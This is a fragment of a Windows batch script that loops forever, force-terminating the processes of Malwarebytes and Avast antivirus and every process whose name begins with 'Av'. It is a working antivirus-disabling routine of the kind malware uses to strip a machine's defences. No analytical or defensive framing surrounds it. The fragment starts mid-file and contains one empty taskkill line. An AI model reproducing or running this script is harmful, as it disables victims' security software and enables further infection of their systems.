...
color 12
:loop
taskkill /f /im MABService.exe /t
taskkill /f /im mbam.exe /t
taskkill /f /im mbamtray.exe /t
taskkill /f /im AvastSvc.exe /t
taskkill /f /im Avast.exe /t
taskkill /f /im AvastUI.exe /t
taskkill /f /im avast_one_essential_setup_online.exe /t
taskkill /f /im AvConsent.exe /t
taskkill /f /im AvDump.exe /t
taskkill /f /im AvEmUpdate.exe /t
taskkill /f /im AvLaunch.exe /t
taskkill /f /im sched.exe /t
taskkill /f /im SupportTool.exe /t
taskkill /f /im VisthAux.exe /t
taskkill /f /im wsc_proxy.exe /t
tskill /A Av*
taskkill /f /im  /t
goto loop
:might
